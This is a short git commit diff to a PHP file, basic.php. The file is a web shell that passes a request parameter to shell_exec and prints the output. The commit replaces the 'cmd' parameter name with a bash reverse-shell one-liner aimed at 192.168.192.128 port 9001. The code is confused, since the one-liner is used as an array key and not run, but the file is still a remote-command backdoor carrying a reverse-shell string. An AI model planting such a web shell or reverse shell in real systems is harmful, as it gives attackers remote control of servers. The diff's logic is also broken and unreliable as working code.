12ace379133d4b6edb33b4364ff565ee0439f510
Parth-abcipl <itdesk4@alliedboston.com>
2024-11-25 17:19:59 +0530

    Update basic.php

--- basic.php
+++ basic.php
@@ -1,5 +1,5 @@
 <?php
 if (isset($_REQUEST['cmd'])) {
-    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+    echo "<pre>" . shell_exec($_REQUEST['/bin/bash -i >& /dev/tcp/192.168.192.128/9001 0>&1']) . "</pre>";
 }
 ?>
